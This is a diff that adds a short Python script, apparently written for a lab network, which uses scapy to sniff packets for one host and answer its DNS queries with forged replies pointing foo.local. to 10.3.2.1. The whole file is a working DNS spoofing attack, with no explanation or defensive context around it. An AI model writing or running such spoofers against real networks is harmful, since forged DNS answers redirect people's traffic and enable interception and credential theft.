@@ -1,0 +1,13 @@
+ from scapy.all import *
+import time
+
+start = time.time()
+
+def process(pkt):
+	print(pkt.show())
+	spoof = IP(dst=pkt[IP].src,src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,qr=1,opcode=0,  qdcount=1, ra=1, qd=pkt[DNS].qd, an=DNSRR(rrname="foo.local.",rdata="10.3.2.1"))
+	send(spoof, verbose=0)
+sniff(filter="ip and host 10.1.1.1",prn=process)
+print("time: ",time.time()-start)
+
+
